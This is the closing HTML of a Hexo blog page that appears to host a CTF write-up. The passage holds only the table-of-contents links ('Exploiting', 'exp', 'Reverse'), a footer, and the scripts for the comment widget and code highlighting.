class="toc-number">1.1.2.2.</span> <span class="toc-text">main function</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#enc-print-function"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">enc_print function</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploiting"><span class="toc-number">1.1.3.</span> <span class="toc-text">Exploiting</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">1.2.</span> <span class="toc-text">Reverse</span></a></li></ol></li></ol></div></div></div><footer><nobr><span class="text-title">ICP</span><a class="text-content" target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">赣ICP备19008355号</a></nobr><nobr><span class="text-title">©</span><span class="text-content">1970 to 2020</span></nobr><br><nobr>published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknight</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><div id="cursor-container"><div id="cursor-outer"></div><div id="cursor-effect"></div></div><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{new Valine({
 el: '#Valine'
 , appId: 'LSe7mf1XYliLqgIrc3jlqXfT-gzGzoHsz'
 , appKey: 'Fu9giJfnidkCamaW89FUpidw' , placeholder: '此条评论委托企鹅物流发送'
});code.findCode();mermaid.init(undefined, ('.mermaid'));}</script><script src="//unpkg.com/@highlightjs/cdn-assets@11.4.0/highlight.min.js"></script><script src="/js/arknights.js"></script><script>window.addEventListener("load",()=>{reset()})</script></body></html>